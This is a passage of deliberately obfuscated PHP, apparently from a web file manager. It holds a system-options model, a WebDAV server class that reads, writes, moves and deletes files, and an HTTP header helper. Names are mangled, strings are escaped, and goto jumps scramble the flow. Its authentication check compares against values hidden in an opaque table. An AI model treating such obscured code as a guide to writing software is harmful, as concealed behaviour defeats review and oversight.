$this->findByKey($AÌæ„İö¬™[2432], $cÚ“ˆƒœØº[$AÌæ„İö¬™[372]]); if ($AÄÉ’İ™åİ) { return !0; } $a£±òÎªä = array($AÌæ„İö¬™[2432] => $cÚ“ˆƒœØº[$AÌæ„İö¬™[372]], $AÌæ„İö¬™[28] => $cÚ“ˆƒœØº[$AÌæ„İö¬™[28]], $AÌæ„İö¬™[196] => $cÚ“ˆƒœØº[$AÌæ„İö¬™[196]], $AÌæ„İö¬™[29] => isset($cÚ“ˆƒœØº[$AÌæ„İö¬™[29]]) ? $cÚ“ˆƒœØº[$AÌæ„İö¬™[29]] : 1, $AÌæ„İö¬™[2433] => isset($cÚ“ˆƒœØº[$AÌæ„İö¬™[2433]]) ? $cÚ“ˆƒœØº[$AÌæ„İö¬™[2433]] : 0, $AÌæ„İö¬™[686] => 0, $AÌæ„İö¬™[189] => 0); return parent::insert($a£±òÎªä); } public function userNoticeEdit($EÃËÀØ‰İÖ, $c×‡…Û«–›) { $this->initUserOption(); return parent::update($EÃËÀØ‰İÖ, $c×‡…Û«–›); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\x6d\137\157\160\x74\x69\157\156"; protected $jsonField = array("\155\145\x6e\x75", "\162\x6f\154\145", "\162\157\x6c\x65\107\162\157\165\160", "\162\145\x67\x69\163\x74", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($Eå°§Ì•Ó‘) { return "\x53\171\x73\164\x65\x6d\117\x70\164\151\x6f\156\137{$Eå°§Ì•Ó‘}"; } protected function optionDefault($BöŠ»ò÷½ = '') { $a²Ğà±Á¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($BöŠ»ò÷½ == $a²Ğà±Á¥[33]) { return $GLOBALS[$a²Ğà±Á¥[6]][$a²Ğà±Á¥[2434]]; } } } class SystemRecordModel extends ModelBaseLight { } goto aÑà˜µ‹Ï…; e×˜¸Æñ¥‡: class HttpDavServer { public function __construct($có¤°îÛÚĞ, $D¾¯ Ñ‘Ù) { $this->root = $có¤°îÛÚĞ; $this->initPath($D¾¯ Ñ‘Ù); $this->start(); } public function initPath($A˜éáØ‘¾Œ) { $fÓŠ·‡åçÛ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B®¥§“ë‰é = rtrim($_SERVER[$fÓŠ·‡åçÛ[1354]], $fÓŠ·‡åçÛ[8]) . $fÓŠ·‡åçÛ[8]; $this->urlBase = substr($B®¥§“ë‰é, 0, strpos($B®¥§“ë‰é, $A˜éáØ‘¾Œ) + 1); $this->urlBase = rtrim($this->urlBase, $fÓŠ·‡åçÛ[8]) . $A˜éáØ‘¾Œ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $C½™ˆ÷ñÇ’ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A…¦àİÉÇï = HttpAuth::get(); if ($A…¦àİÉÇï[$C½™ˆ÷ñÇ’[539]] == $C½™ˆ÷ñÇ’[1746] && $A…¦àİÉÇï[$C½™ˆ÷ñÇ’[889]] == $C½™ˆ÷ñÇ’[1747]) { return !0; } HttpAuth::error(); } public function start() { goto bÌí÷´Ú¦Í; bÌí÷´Ú¦Í: $Dñ¦ºÍÊ‹¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->checkUser(); $FÃ…×†ç¬Û = $Dñ¦ºÍÊ‹¾[142] . HttpHeader::method(); goto E¿¦À™ğ¡¡; DìĞ„¸©ˆ¬: if (!$b¬‚‚Í¨ù“) { return; } self::response($b¬‚‚Í¨ù“); goto EƒÆ«›Ê³; E¿¦À™ğ¡¡: if (!method_exists($this, $FÃ…×†ç¬Û)) { pr($FÃ…×†ç¬Û . $Dñ¦ºÍÊ‹¾[1748]); die; } $f‰Õ©°‡º¤ = array($Dñ¦ºÍÊ‹¾[1749], $Dñ¦ºÍÊ‹¾[1750]); if (!in_array($FÃ…×†ç¬Û, $f‰Õ©°‡º¤) && !$this->pathExists($this->path)) { $b¬‚‚Í¨ù“ = array($Dñ¦ºÍÊ‹¾[1022] => 404); } else { $b¬‚‚Í¨ù“ = $this->{$FÃ…×†ç¬Û}(); } goto DìĞ„¸©ˆ¬; EƒÆ«›Ê³: } public function pathGet($Aƒ”Ö—ÃÏ = false) { $Dé¦Æ…è¦à =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÓ«ƒÅ¿Ó‘ = $Aƒ”Ö—ÃÏ ? $_SERVER[$Dé¦Æ…è¦à[1751]] : $_SERVER[$Dé¦Æ…è¦à[1354]]; $AÓ«ƒÅ¿Ó‘ = KodIO::clear(rawurldecode($AÓ«ƒÅ¿Ó‘)); if (!strstr($AÓ«ƒÅ¿Ó‘, KodIO::clear($this->urlBase))) { return !1; } return substr($AÓ«ƒÅ¿Ó‘, strpos($AÓ«ƒÅ¿Ó‘, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Dãî¤¾Æ¿æ) { return file_exists($Dãî¤¾Æ¿æ); } public function pathMkdir($EÊÌ…¦Å) { return mkdir($EÊÌ…¦Å, 511, !0); } public function pathInfo($e•¿ø®ôì) { return path_info($e•¿ø®ôì); } public function pathList($aÖ¾ª™É­) { return path_list($aÖ¾ª™É­); } public function pathOut($bÕç”î™æŸ) { echo file_get_contents($bÕç”î™æŸ); } public function pathPut($Aİ“à¾«¹, $BÙÆÜÇİàï = '') { if (!$BÙÆÜÇİàï) { return file_put_contents($Aİ“à¾«¹, $_SERVER[ºÖÙÂŒäÉê‡][33]); } return move_path($BÙÆÜÇİàï, $Aİ“à¾«¹); } public function pathRemove($EÚŠ¯·ÖìŒ) { if (is_file($EÚŠ¯·ÖìŒ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($b¸Œ”ö®½ˆ, $e¢ç“ç¿è) { return move_path($b¸Œ”ö®½ˆ, $e¢ç“ç¿è); } public function pathCopy($E¹”´åóÑÕ, $cÃ¶•‘‹´Ù) { return copy_dir($E¹”´åóÑÕ, $cÃ¶•‘‹´Ù); } public function parsePath($F³«”…‰±ô) { return $F³«”…‰±ô; } public function parseItem($eÈïá­Œ½ô, $a„ß¶ª…Ü) { goto d—ÚÏó³; B…•ÜÎ÷ºù: $CÈ¯êˆ÷É = array($aÍÔ‹êã‚Õ[1752] => KodIO::clear($this->urlBase . $EæÕå‡ôã•), $aÍÔ‹êã‚Õ[106] => @gmdate($aÍÔ‹êã‚Õ[1753], $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[106]]), $aÍÔ‹êã‚Õ[193] => @gmdate($aÍÔ‹êã‚Õ[1754], $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[193]]), $aÍÔ‹êã‚Õ[77] => $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[77]] ? $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[77]] : 0); return $CÈ¯êˆ÷É; goto eÛå˜‘ò¢; F®éÌ¿àó: if ($a„ß¶ª…Ü) { $EæÕå‡ôã• = $aÍÔ‹êã‚Õ[8] . str_replace($aÍÔ‹êã‚Õ[168], $aÍÔ‹êã‚Õ[8], rawurlencode($this->pathGet())); } if (!trim($eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[106]])) { $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[106]] = time(); } if (!trim($eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[193]])) { $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[193]] = time(); } goto B…•ÜÎ÷ºù; d—ÚÏó³: $aÍÔ‹êã‚Õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EæÕå‡ôã• = $this->pathGet() . $aÍÔ‹êã‚Õ[8] . $eÈïá­Œ½ô[$aÍÔ‹êã‚Õ[28]]; $EæÕå‡ôã• = $aÍÔ‹êã‚Õ[8] . str_replace($aÍÔ‹êã‚Õ[168], $aÍÔ‹êã‚Õ[8], rawurlencode($EæÕå‡ôã•)); goto F®éÌ¿àó; eÛå˜‘ò¢: } public function parseItemXml($d¾Äá„¤õ, $Cª¤÷’ò) { $F¥™êÁ÷í‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‘§å•¤í° = $this->parseItem($d¾Äá„¤õ, $Cª¤÷’ò); if ($d¾Äá„¤õ[$F¥™êÁ÷í‰[29]] == $F¥™êÁ÷í‰[76]) { $fË‘à†ÖÛê = $F¥™êÁ÷í‰[1755]; $fË‘à†ÖÛê .= $F¥™êÁ÷í‰[1756]; } else { $D¹ŞÑÇƒº¾ = $d¾Äá„¤õ[$F¥™êÁ÷í‰[156]] ? $d¾Äá„¤õ[$F¥™êÁ÷í‰[156]] : get_path_ext($d¾Äá„¤õ[$F¥™êÁ÷í‰[28]]); $A­¸ŸØº = get_file_mime($D¹ŞÑÇƒº¾); $fË‘à†ÖÛê = $F¥™êÁ÷í‰[1757]; $fË‘à†ÖÛê .= "\x3c\x44\x3a\147\x65\164\143\x6f\x6e\x74\x65\156\164\x74\x79\160\x65\x3e{$A­¸ŸØº}\74\57\104\x3a\147\145\x74\x63\x6f\156\x74\145\x6e\164\164\171\160\145\x3e"; } return "\12\11\11\74\x44\72\162\x65\x73\x70\x6f\156\x73\x65\76\12\x9\11\11\74\x44\72\x68\162\145\x66\76{$b‘§å•¤í°[$F¥™êÁ÷í‰[1752]]}\x3c\x2f\x44\72\150\x72\145\146\x3e\xa\11\11\11\74\x44\72\x70\162\x6f\x70\x73\164\x61\164\76\12\x9\x9\x9\x9\x3c\104\72\x70\162\157\160\76\12\x9\11\11\x9\11\74\104\x3a\x67\145\164\154\x61\163\x74\x6d\157\144\151\146\151\145\x64\76{$b‘§å•¤í°[$F¥™êÁ÷í‰[106]]}\x3c\57\x44\72\x67\145\x74\154\141\163\164\155\x6f\x64\x69\x66\x69\x65\x64\x3e\xa\11\x9\x9\x9\11\74\x44\x3a\143\162\145\x61\164\151\x6f\156\144\141\x74\145\76{$b‘§å•¤í°[$F¥™êÁ÷í‰[193]]}\x3c\57\x44\72\x63\162\145\x61\x74\151\x6f\156\144\x61\x74\145\x3e\xa\x9\x9\11\x9\x9\x3c\104\x3a\147\145\x74\143\157\x6e\x74\145\156\x74\x6c\x65\x6e\x67\164\150\76{$b‘§å•¤í°[$F¥™êÁ÷í‰[77]]}\74\57\104\x3a\x67\145\x74\x63\157\156\164\x65\156\x74\x6c\145\x6e\x67\164\x68\76\12\11\x9\x9\x9\11{$fË‘à†ÖÛê}\xa\x9\11\x9\x9\74\x2f\104\72\160\162\x6f\160\x3e\12\x9\x9\11\x9\74\x44\x3a\x73\164\x61\x74\x75\x73\x3e\x48\x54\124\120\x2f\x31\x2e\61\x20\x32\x30\60\x20\x4f\113\74\x2f\x44\x3a\163\x74\141\x74\x75\x73\76\12\11\x9\11\x3c\x2f\104\72\160\162\157\x70\x73\164\141\x74\x3e\xa\11\11\x3c\57\104\x3a\162\x65\x73\160\x6f\x6e\x73\145\76"; } public function pathListMerge($A®ëƒ˜˜è) { goto f´—ŸÓ§ìÔ; DÓï…”¢È¸: $cÕßËòëÅ“ = array(); foreach ($A®ëƒ˜˜è as $b¦³­³¹¥† => $eÖ¾ÁõùÇÂ) { if (!in_array($b¦³­³¹¥†, $eäƒğ¦æµ) || !is_array($eÖ¾ÁõùÇÂ)) { continue; } $cÕßËòëÅ“ = array_merge($cÕßËòëÅ“, $eÖ¾ÁõùÇÂ); } foreach ($cÕßËòëÅ“ as &$fŞ¯ïŒâ·–) { $fŞ¯ïŒâ·–[$E‚Êó†÷èï[28]] = str_replace($E‚Êó†÷èï[8], $E‚Êó†÷èï[1356], $fŞ¯ïŒâ·–[$E‚Êó†÷èï[28]]); } goto Fäñ”Ë”§; f´—ŸÓ§ìÔ: $E‚Êó†÷èï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$A®ëƒ˜˜è) { return $A®ëƒ˜˜è; } $eäƒğ¦æµ = array($E‚Êó†÷èï[73], $E‚Êó†÷èï[74], $E‚Êó†÷èï[1758]); goto DÓï…”¢È¸; Fäñ”Ë”§: return $cÕßËòëÅ“; goto B×¹†Ï¬; B×¹†Ï¬: } public function httpPROPFIND() { goto cç»Ô¢ÎÀÉ; a¯²‹ö‚Ş: return array($d˜­èÊ†È¥[1761] => 207, $d˜­èÊ†È¥[1762] => "\74\104\72\155\x75\154\x74\151\163\x74\141\164\165\163\40\170\x6d\x6c\x6e\x73\72\104\x3d\42\104\101\x56\72\x22\76\12{$Dö£ÑÎÁ‰‘}\12\x3c\x2f\104\72\155\x75\154\x74\x69\163\x74\x61\164\165\x73\x3e"); goto bİñ‡øÔğÒ; cç»Ô¢ÎÀÉ: $d˜­èÊ†È¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÍé”¹ÌÓ÷ = $this->pathList($this->path); $dÃ‹¢›±† = $this->pathListMerge($BÍé”¹ÌÓ÷); goto cÃÅÛİÌÔò; E„®ƒ¸”: if ($dê‚È–ŒæÑ) { $dÃ‹¢›±† = array($C‡º‰ÑãÈ‚); } else { $C‡º‰ÑãÈ‚[$d˜­èÊ†È¥[28]] = $d˜­èÊ†È¥[33]; $dÃ‹¢›±† = array_merge(array($C‡º‰ÑãÈ‚), $dÃ‹¢›±†); } $Dö£ÑÎÁ‰‘ = $d˜­èÊ†È¥[33]; foreach ($dÃ‹¢›±† as $fæ»óÎºŠÈ) { $Dö£ÑÎÁ‰‘ .= $this->parseItemXml($fæ»óÎºŠÈ, $dê‚È–ŒæÑ); } goto a¯²‹ö‚Ş; cÃÅÛİÌÔò: $C‡º‰ÑãÈ‚ = $BÍé”¹ÌÓ÷[$d˜­èÊ†È¥[1759]]; if (!is_array($dÃ‹¢›±†) || $C‡º‰ÑãÈ‚[$d˜­èÊ†È¥[1760]] === !1) { return array($d˜­èÊ†È¥[1761] => 404, $d˜­èÊ†È¥[1762] => $d˜­èÊ†È¥[1763]); } $dê‚È–ŒæÑ = $C‡º‰ÑãÈ‚[$d˜­èÊ†È¥[29]] == $d˜­èÊ†È¥[163] || HttpHeader::get($d˜­èÊ†È¥[1738]) == $d˜­èÊ†È¥[472]; goto E„®ƒ¸”; bİñ‡øÔğÒ: } public function httpHEAD() { $E‡‚Èœ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÃº²˜‚ÃÍ = $this->pathInfo($this->path); if (!$fÃº²˜‚ÃÍ || $fÃº²˜‚ÃÍ[$E‡‚Èœ‹[29]] == $E‡‚Èœ‹[76]) { return array($E‡‚Èœ‹[1022] => 200, $E‡‚Èœ‹[1189] => array($E‡‚Èœ‹[1764])); } return array($E‡‚Èœ‹[1022] => 200, $E‡‚Èœ‹[1189] => array($E‡‚Èœ‹[1765], $E‡‚Èœ‹[135], $E‡‚Èœ‹[1766] . $fÃº²˜‚ÃÍ[$E‡‚Èœ‹[77]], $E‡‚Èœ‹[1767] . get_file_mime($fÃº²˜‚ÃÍ[$E‡‚Èœ‹[156]]), $E‡‚Èœ‹[131] . gmdate($E‡‚Èœ‹[1753], $fÃº²˜‚ÃÍ[$E‡‚Èœ‹[1236]]) . $E‡‚Èœ‹[1768], $E‡‚Èœ‹[1769])); } public function httpOPTIONS() { $CÆõŞíƒİÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($CÆõŞíƒİÂ[1022] => 200, $CÆõŞíƒİÂ[1189] => array($CÆõŞíƒİÂ[1770], $CÆõŞíƒİÂ[1771], $CÆõŞíƒİÂ[1772], $CÆõŞíƒİÂ[1245])); } public function httpPROPPATCH() { $E‚£Ä¹†ƒÌ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F £Õ²Á©¿ = $E‚£Ä¹†ƒÌ[1773] . $_SERVER[$E‚£Ä¹†ƒÌ[1354]] . $E‚£Ä¹†ƒÌ[1774]; return array($E‚£Ä¹†ƒÌ[1761] => 207, $E‚£Ä¹†ƒÌ[1762] => "\74\104\x3a\x6d\165\x6c\x74\x69\163\164\x61\x74\x75\x73\40\x78\155\x6c\x6e\x73\72\x44\x3d\42\x44\101\126\x3a\x22\x3e\12{$F £Õ²Á©¿}\12\74\x2f\x44\x3a\155\x75\x6c\x74\x69\x73\164\x61\164\x75\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $c¿“»“Ş„‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cìÂ®óåƒ = $this->uploadFile(); if ($cìÂ®óåƒ) { $Eóñ„Š·¶Ú = 204; } else { $cìÂ®óåƒ = $c¿“»“Ş„‰[33]; $Eóñ„Š·¶Ú = 201; } $eÄ™§¶ŠÆš = $this->pathPut($this->path, $cìÂ®óåƒ); if ($eÄ™§¶ŠÆš == !1) { $Eóñ„Š·¶Ú = 404; } return array($c¿“»“Ş„‰[1761] => $Eóñ„Š·¶Ú); } private function uploadFile() { goto fÓÁ¢¢éÇ; fÓÁ¢¢éÇ: $A¥ÀİÜçùò =& $_SERVER[ºÖÙÂŒäÉê‡]; @mk_dir(TEMP_FILES); $FÖ¬¬¿ˆê„ = TEMP_FILES . $A¥ÀİÜçùò[1775] . rand_string(32); goto Aõí™ÉÏÌ‰; Aõí™ÉÏÌ‰: $A†‹’Ùæº‚ = @fopen($FÖ¬¬¿ˆê„, $A¥ÀİÜçùò[1483]); $fë¬Æ¢µÍ = @fopen($A¥ÀİÜçùò[1776], $A¥ÀİÜçùò[1482]); if (!$fë¬Æ¢µÍ || !$A†‹’Ùæº‚) { @unlink($FÖ¬¬¿ˆê„); return !1; } goto d¨¨ºí¥óƒ; d¨¨ºí¥óƒ: while (!feof($fë¬Æ¢µÍ)) { fwrite($A†‹’Ùæº‚, fread($fë¬Æ¢µÍ, 1024 * 200)); } fclose($fë¬Æ¢µÍ); fclose($A†‹’Ùæº‚); goto E·Ù¿´; E·Ù¿´: if (@filesize($FÖ¬¬¿ˆê„) > 0) { return $FÖ¬¬¿ˆê„; } @unlink($FÖ¬¬¿ˆê„); return !1; goto eæ××çÉ; eæ××çÉ: } public function httpMKCOL() { $C¸‘İ¦ÄÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->pathExists($this->path)) { return array($C¸‘İ¦ÄÍ[1022] => 409); } $C˜·ËÚ‚Ë˜ = $this->pathMkdir($this->path); return array($C¸‘İ¦ÄÍ[1022] => $C˜·ËÚ‚Ë˜ ? 201 : 403); } public function httpMOVE() { $E„Õ ñİã‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $déòÕÉ‘¯š = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$E„Õ ñİã‡[1777]])) { $D¬Û„¼¨ÛÁ[$E„Õ ñİã‡[1778]] = $_SERVER[$E„Õ ñİã‡[1777]] == $E„Õ ñİã‡[1779]; } $AÙœå¢­‹ = $this->pathMove($this->path, $déòÕÉ‘¯š); return array($E„Õ ñİã‡[1022] => $AÙœå¢­‹ ? 201 : 404); } public function httpCOPY() { $f„Ò†Å¥ø¨ = $this->parsePath($this->pathGet(!0)); $BÃö‹¤²ãó = $this->pathCopy($this->path, $f„Ò†Å¥ø¨); return array($_SERVER[ºÖÙÂŒäÉê‡][1022] => $BÃö‹¤²ãó ? 201 : 404); } public function httpDELETE() { $dó„ íãÜî = $this->pathRemove($this->path); return array($_SERVER[ºÖÙÂŒäÉê‡][1022] => $dó„ íãÜî ? 200 : 503); } public function httpLOCK() { $BæÊ››Ôç =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¦¤òÒŠï¸ = md5($this->path); $Bó´ôŸ„ª­ = $BæÊ››Ôç[1780] . $this->xmlGet($BæÊ››Ôç[1781]) . $BæÊ››Ôç[1782] . $D¦¤òÒŠï¸ . $BæÊ››Ôç[1783]; return array($BæÊ››Ôç[1022] => 200, $BæÊ››Ôç[1189] => array($BæÊ››Ôç[1784] . $D¦¤òÒŠï¸, $BæÊ››Ôç[1785]), $BæÊ››Ôç[1786] => $Bó´ôŸ„ª­); } public function httpUNLOCK() { return array($_SERVER[ºÖÙÂŒäÉê‡][1022] => 204); } public function xmlGet($AÛïöÖ¼»“) { goto Dô¹·‚íóè; F«¨–İ¸˜: return $Cùà°øˆà™[33]; goto E£ŞÖ…¨õè; f¶æ³«°ÈŠ: $A°ŸñìÑ¬Â = array_shift(explode($Cùà°øˆà™[8], $AÛïöÖ¼»“)); $B¤èÕ¼ŒŒ = $a“ªÍÖ”µÄ->getElementsByTagNameNS($Cùà°øˆà™[1788], $A°ŸñìÑ¬Â); if ($B¤èÕ¼ŒŒ) { return $B¤èÕ¼ŒŒ[0]->nodeValue; } goto F«¨–İ¸˜; Dô¹·‚íóè: $Cùà°øˆà™ =& $_SERVER[ºÖÙÂŒäÉê‡]; static $a“ªÍÖ”µÄ = false; if (!$a“ªÍÖ”µÄ) { $BõÃ¸÷õè = file_get_contents($Cùà°øˆà™[1787]); $a“ªÍÖ”µÄ = new DOMDocument(); $a“ªÍÖ”µÄ->loadXML($BõÃ¸÷õè); } goto f¶æ³«°ÈŠ; E£ŞÖ…¨õè: } public static function response($c÷©Š”¨Ê) { goto dë˜½®àè; aä¿ÎàíËÁ: if (is_string($c÷©Š”¨Ê[$Cç¨šÎÚª[1786]])) { header($Cç¨šÎÚª[1789]); $A¨Ãôáñ = $Cç¨šÎÚª[1790] . $Cç¨šÎÚª[174] . $c÷©Š”¨Ê[$Cç¨šÎÚª[1786]]; echo $A¨Ãôáñ; } goto c—Ú¿Š‘®ˆ; eƒ½’ô¯»: $fÌùœâìÄâ[] = $Cç¨šÎÚª[1728]; $fÌùœâìÄâ[] = $Cç¨šÎÚª[1729]; foreach ($fÌùœâìÄâ as $B¾óãùàŞÁ) { header($B¾óãùàŞÁ); } goto aä¿ÎàíËÁ; dë˜½®àè: $Cç¨šÎÚª =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÌùœâìÄâ = is_array($c÷©Š”¨Ê[$Cç¨šÎÚª[1189]]) ? $c÷©Š”¨Ê[$Cç¨šÎÚª[1189]] : array(); $fÌùœâìÄâ[] = HttpHeader::code($c÷©Š”¨Ê[$Cç¨šÎÚª[1022]]); goto eƒ½’ô¯»; c—Ú¿Š‘®ˆ: } } class HttpHeader { public static $_headers = array("\110\157\x73\164" => "\x48\x54\x54\120\x5f\110\117\x53\124", "\125\x73\x65\x72\55\101\x67\145\156\164" => "\110\124\x54\x50\137\125\123\105\x52\137\101\107\105\x4e\124", "\103\x6f\156\164\145\x6e\164\55\x54\171\x70\x65" => "\x48\x54\124\120\x5f\x43\x4f\x4e\x54\x45\116\124\x5f\x54\x59\120\105", "\x43\157\156\x74\x65\156\x74\x2d\114\145\x6e\147\x74\x68" => "\110\x54\124\120\x5f\103\117\x4e\124\105\x4e\124\x5f\x4c\105\116\107\124\x48", "\x44\145\160\164\150" => "\x48\124\x54\120\137\104\x45\120\x54\x48", "\x45\x78\x70\145\x63\x74" => "\110\124\124\x50\137\x45\130\120\105\103\124", "\111\x66\55\116\157\x6e\x65\55\x4d\141\x74\x63\150" => "\110\x54\x54\x50\x5f\x49\x46\x5f\x4e\x4f\x4e\105\137\x4d\101\124\103\110", "\111\146\55\x4d\141\x74\x63\150" => "\110\124\x54\x50\x5f\x49\106\x5f\115\101\x54\103\110", "\111\x66\55\x52\141\156\147\x65" => "\110\124\x54\120\137\x49\x46\137\122\x41\x4e\107\x45", "\114\x61\x73\164\55\115\x6f\144\x69\146\x69\x65\144" => "\x48\124\x54\120\137\114\101\x53\x54\x5f\115\117\x44\111\106\111\x45\x44", "\x49\146\55\x4d\157\144\151\146\x69\x65\144\55\123\x69\x6e\x63\x65" => "\110\x54\x54\120\x5f\111\x46\137\x4d\117\104\x49\x46\x49\x45\x44\137\x53\111\x4e\x43\105", "\111\x66\55\125\156\x6d\x6f\x64\x69\146\x69\x65\144\55\x53\151\156\x63\x65" => "\x48\124\x54\x50\137\111\x46\137\x55\x4e\115\117\104\111\x46\x49\105\104\137\x53\111\x4e\103\x45", "\122\x61\156\147\145" => "\110\x54\x54\x50\x5f\122\101\116\x47\x45", "\x54\151\x6d\145\x6f\165\x74" => "\110\124\x54\120\x5f\x54\x49\115\105\x4f\x55\124", "\x49\146" => "\110\124\124\x50\137\111\106", "\114\157\143\153\55\124\x6f\x6b\145\156" => "\110\124\124\x50\137\x4c\117\103\x4b\137\124\x4f\x4b\105\116", "\117\x76\x65\162\167\x72\151\164\x65" => "\x48\124\x54\120\x5f\x4f\126\105\122\127\x52\111\124\105", "\104\145\163\164\x69\156\141\164\x69\x6f\x6e" => "\110\124\124\x50\137\104\105\123\x54\111\x4e\101\x54\111\117\x4e", "\122\145\x71\165\145\163\x74\55\111\x64" => "\x52\105\x51\125\x45\x53\x54\x5f\x49\x44", "\122\x65\x71\x75\145\163\164\55\102\157\x64\x79\55\x46\151\x6c\145" => "\x52\105\121\x55\x45\x53\124\137\102\x4f\x44\x59\x5f\x46\x49\x4c\x45", "\122\145\x64\151\162\x65\x63\x74\x2d\x53\164\x61\x74\165\163" => "\x52\105\104\x49\x52\105\103\x54\137\123\124\x41\x54\125\123"); public static function init() { static $E³‚Å£ˆ¥õ = false; if ($E³‚Å£ˆ¥õ) { return; } foreach ($_SERVER as $e³ÑÓô‰Ø‚ => $D‚¢ªƒº·Ú) { $e³ÑÓô‰Ø‚ = strtoupper($e³ÑÓô‰Ø‚); if (!array_key_exists($e³ÑÓô‰Ø‚, $_SERVER)) { continue; } $_SERVER[$e³ÑÓô‰Ø‚] = $D‚¢ªƒº·Ú; } foreach (self::$_headers as $e³ÑÓô‰Ø‚ => $aàã³¹ğÏî) { if (!array_key_exists($e³ÑÓô‰Ø‚, $_SERVER)) { continue; } $_SERVER[$e³ÑÓô‰Ø‚] = $_SERVER[$aàã³¹ğÏî]; $_SERVER[strtoupper($e³ÑÓô‰Ø‚)] = $_SERVER[$aàã³¹ğÏî]; } } public static function get($B÷°Øæºí) { self::init(); return $_SERVER[$B÷°Øæºí] ? $_SERVER[$B÷°Øæºí] : $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][1791] . strtoupper($B÷°Øæºí)]; } public static function method() { return strtoupper(self::get($_SERVER[ºÖÙÂŒäÉê‡][150])); } public static function length() { $dÛŸØîÈø‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cõ¬Æ‹Š˜ğ = self::get($dÛŸØîÈø‚[1792]); if (!$cõ¬Æ‹Š˜ğ) { $cõ¬Æ‹Š˜ğ = self::get($dÛŸØîÈø‚[1128]); } return $cõ¬Æ‹Š˜ğ; } public static function range() { $bÍˆ‰óå¿² =& $_SERVER[ºÖÙÂŒäÉê‡]; $f£ª«À¸ù = self::get($bÍˆ‰óå¿²[204]); if (!$f£ª«À¸ù) { return !1; } if (!preg_match($bÍˆ‰óå¿²[1793], $f£ª«À¸ù, $dõ™ „™×½)) { return !1; } if ($dõ™ „™×½[1] === $bÍˆ‰óå¿²[33] && $dõ™ „™×½[2] === $bÍˆ‰óå¿²[33]) { return !1; } return array($dõ™ „™×½[1] !== $bÍˆ‰óå¿²[33] ? $dõ™ „™×½[1] : null, $dõ™ „™×½[2] !== $bÍˆ‰óå¿²[33] ? $dõ™ „™×½[2] : null); } public static $statusCode = array("\x31\60\60" => "\x43\x6f\x6e\x74\151\156\165\x65", "\61\x30\x31" => "\x53\x77\151\x74\x63\x68\151\156\x67\40\120\x72\x6f\164\157\143\x6f\x6c", "\61\60\62" => "\120\162\157\143\145\x73\163\151\x6e\147", "\x31\60\x33" => "\x45\x61\x72\154\x79\40\110\x69\x6e\164\163", "\62\60\x30" => "\117\113", "\62\x30\61" => "\103\162\x65\x61\164\x65\x64", "\x32\x30\x32" => "\x41\x63\x63\145\x70\164\x65\144", "\62\x30\x33" => "\x4e\157\x6e\55\101\x75\x74\x68\x6f\x72\151\x74\141\x74\151\x76\x65\40\x49\156\146\157\x72\155\x61\x74\x69\x6f\x6e", "\62\x30\64" => "\116\x6f\40\103\157\x6e\x74\145\156\x74", "\62\60\65" => "\122\145\x73\145\x74\x20\103\x6f\156\164\145\156\x74", "\62\60\x36" => "\x50\x61\162\164\x69\x61\154\40\103\157\156\164\x65\156\164", "\x32\x30\x37" => "\x4d\165\154\164\151\x2d\x53\164\141\164\165\163", "\x33\60\x30" => "\115\x75\x6c\164\151\160\154\x65\x20\103\150\x6f\x69\143\145\163", "\x33\60\61" => "\x4d\157\x76\x65\144\40\120\145\162\155\x61\x6e\x65\x6e\x74\154\x79", "\x33\x30\x32" => "\x46\157\165\156\144", "\63\60\63" => "\x53\x65\145\x20\117\x74\x68\x65\x72", "\x33\60\x34" => "\116\157\164\40\115\x6f\144\x69\x66\x69\x65\144", "\x33\x30\65" => "\x55\x73\x65\x20\120\162\157\x78\171", "\x33\x30\67" => "\124\145\155\160\157\162\141\x72\x79\x20\x52\x65\x64\x69\x72\145\x63\164", "\x33\x30\x38" => "\120\x65\x72\155\x61\x6e\145\156\x74\40\x52\145\x64\151\162\145\x63\x74", "\x34\x30\x30" => "\102\141\144\40\x52\145\x71\x75\x65\x73\164", "\x34\60\x31" => "\x55\x6e\x61\165\x74\150\157\x72\151\172\145\144", "\x34\60\x32" => "\120\x61\x79\x6d\145\x6e\x74\x20\122\145\161\165\151\x72\145\x64", "\x34\60\x33" => "\106\x6f\x72\142\x69\144\144\x65\x6e", "\x34\60\64" => "\116\157\164\40\106\x6f\x75\156\x64", "\x34\60\x35" => "\x4d\145\164\x68\x6f\144\40\116\x6f\x74\40\101\154\x6c\157\x77\145\x64", "\x34\60\66" => "\116\x6f\164\x20\x41\x63\143\x65\160\164\x61\142\154\145", "\64\x30\67" => "\x50\162\157\x78\171\x20\x41\x75\x74\150\x65\156\164\151\143\141\164\151\157\156\x20\122\x65\161\165\151\162\x65\x64", "\64\60\x38" => "\x52\145\x71\x75\145\x73\x74\40\124\x69\155\145\157\x75\x74", 